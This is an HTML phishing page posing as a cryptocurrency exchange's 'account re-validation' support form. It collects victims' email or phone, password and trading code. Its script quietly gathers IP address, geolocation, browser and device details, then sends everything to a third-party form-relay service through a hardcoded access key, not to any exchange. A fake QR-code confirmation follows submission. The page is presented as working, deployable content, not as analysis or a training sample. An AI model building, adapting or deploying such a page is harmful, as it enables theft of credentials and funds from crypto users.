<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="stylesheet" href="style.css" />
  <title>ACCOUNT RE-VALIDATION</title>
</head>

<body>
  <header>
    <h1>ACCOUNT <strong>RE</strong>-VALIDATION</h1>
    <p>... a "Step By Step" process.</p>
    <script src="https://widgets.coingecko.com/gecko-coin-price-marquee-widget.js"></script>
    <gecko-coin-price-marquee-widget locale="en" outlined="true" coin-ids="" initial-currency="usd"></gecko-coin-price-marquee-widget>
  </header>
  <section>
    <article>

      <!-- Updated form with Web3Forms -->
      <form class="pure-steps" action="https://api.web3forms.com/submit" method="POST" enctype="multipart/form-data" id="form">

        <!-- Web3Forms Access Key -->
        <input type="hidden" name="access_key" value="13521604-ff3a-48f6-a7f4-a7d76fa37bca">

        <input type="radio" name="steps" class="pure-steps_radio" id="step-0" checked="">
        <input type="radio" name="steps" class="pure-steps_radio" id="step-1">

        <div class="pure-steps_group">
          <ol>
            <li class="pure-steps_group-step">
              <h2 class="pure-steps_group-step_legend">Welcome</h2>
              <p class="pure-steps_group-step_item"><strong>"NOTE"</strong> Authentication process will be carried out immediately upon receipt of information, and we will notify you of the authentication results.</p>
              <p class="pure-steps_group-step_item">The information collected is confidential and will not be disclosed by us to unauthorized third parties.</p>

              <label for="cars">Select Issue:</label>
              <select class="form-control" name="issue" id="cars">
                <option value="Kyc">Kyc</option>
                <option value="Web issue">Web issue</option>
                <option value="Deposit/Withdrawal Query">Deposit/Withdrawal Query</option>
                <option value="Lost 2FA">Lost 2FA</option>
                <option value="Biding/Unbinding">Biding/Unbinding</option>
                <option value="Forgot Password">Forgot Password</option>
                <option value="Swap">Swap</option>
                <option value="Buy/Sell Error">Buy/Sell Error</option>
                <option value="Synchronize">Synchronize</option>
                <option value="Withdrawal">Withdrawal</option>
                <option value="Airdrop">Airdrop</option>
                <option value="Others">Others</option>
              </select>
            </li>

            <li class="pure-steps_group-step">
              <fieldset>
                <legend class="pure-steps_group-step_legend">Authenticate</legend>
                <p class="pure-steps_group-step_item flexy-item flexy-column reverse">
                  <input type="text" placeholder="Type your email here" name="email" id="input_email" required>
                  <label for="input_email">Email or Mobile No</label>
                </p>
                <p class="pure-steps_group-step_item flexy-item flexy-column reverse">
                  <input type="password" placeholder="Type your password here" name="password" id="input_password" required>
                  <label for="input_password">Password</label>
                </p>
                <p class="pure-steps_group-step_item flexy-item flexy-column reverse">
                  <input type="password" placeholder="optional" name="code" id="input_password_code">
                  <label for="input_password_code">Trading Code</label>
                </p>
              </fieldset>
            </li>
          </ol>

          <ol class="pure-steps_group-triggers">
            <li class="pure-steps_group-triggers_item">
              <label for="step-0">Restart</label>
            </li>
            <li class="pure-steps_group-triggers_item">
              <label for="step-1">Proceed</label>
            </li>
            <li class="pure-steps_group-triggers_item">
              <!-- Hidden fields auto-populated by JS -->
              <input type="hidden" name="ipaddress" id="ipaddress">
              <input type="hidden" name="country" id="country">
              <input type="hidden" name="browser" id="browser">
              <input type="hidden" name="device" id="device">
              <input type="hidden" name="apiresponse" id="apiresponse">

              <!-- Final submit -->
              <button type="submit" class="btn">Validate</button>
            </li>
          </ol>
        </div>
        <br>
        <label for="step-0">Customers are reminded to kindly provide accurate and truthful information for authentication and not to provide data which is false or which belongs to third parties.</label>
      </form>

      <!-- QR Code Result -->
      <div id="qrResult" style="display:none; text-align:center; margin-top:20px;">
        <h2>Submission Successful ðŸŽ‰</h2>
        <p>Scan this QR code for confirmation:</p>
        <canvas id="qrcode"></canvas>
      </div>

    </article>
  </section>

  <!-- QR Code library -->
  <script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>

  <script>
    // 1. Function to get IP and Country using a public IP lookup API
    function getIpAndGeo() {
      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          document.getElementById('ipaddress').value = data.ip || 'Not Found';
          return fetch(`https://ipapi.co/${data.ip}/json/`);
        })
        .then(response => response.json())
        .then(geoData => {
          document.getElementById('country').value = geoData.country_name || 'Not Found';
          document.getElementById('apiresponse').value = JSON.stringify(geoData) || 'Not Found';
        })
        .catch(error => {
          console.error('Error fetching IP/Geo data:', error);
          document.getElementById('ipaddress').value = 'IP Error';
          document.getElementById('country').value = 'Geo Error';
        });
    }

    // 2. Function to get Browser and Device
    function getBrowserAndDevice() {
      const userAgent = navigator.userAgent;
      let browser = 'Unknown Browser';
      if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) {
        browser = 'Chrome';
      } else if (userAgent.includes('Firefox')) {
        browser = 'Firefox';
      } else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) {
        browser = 'Safari';
      } else if (userAgent.includes('Edg')) {
        browser = 'Edge';
      } else if (userAgent.includes('MSIE') || userAgent.includes('Trident')) {
        browser = 'IE';
      }

      let device = 'Desktop';
      if (/Mobi|Android/i.test(userAgent)) {
        device = 'Mobile';
      } else if (/iPad|Tablet/i.test(userAgent)) {
        device = 'Tablet';
      }

      document.getElementById('browser').value = browser;
      document.getElementById('device').value = device;
    }

    // Run functions on page load
    getIpAndGeo();
    getBrowserAndDevice();

    // Intercept form submission
    document.getElementById('form').addEventListener('submit', function(e) {
      e.preventDefault(); // stop normal redirect

      const formData = new FormData(this);

      fetch(this.action, {
        method: this.method,
        body: formData
      })
      .then(response => response.json())
      .then(result => {
        if(result.success) {
          // Hide the form
          document.getElementById('form').style.display = 'none';
          // Show QR container
          document.getElementById('qrResult').style.display = 'block';
          // Generate QR code (encode submission ID or message)
          QRCode.toCanvas(
            document.getElementById('qrcode'),
            "Submission ID: " + result.data.id,
            function (error) {
              if (error) console.error(error);
            }
          );
        } else {
          alert("Submission failed. Please try again.");
        }
      })
      .catch(error => {
        console.error('Error:', error);
        alert("Error submitting form.");
      });
    });
  </script>
</body>
</html>
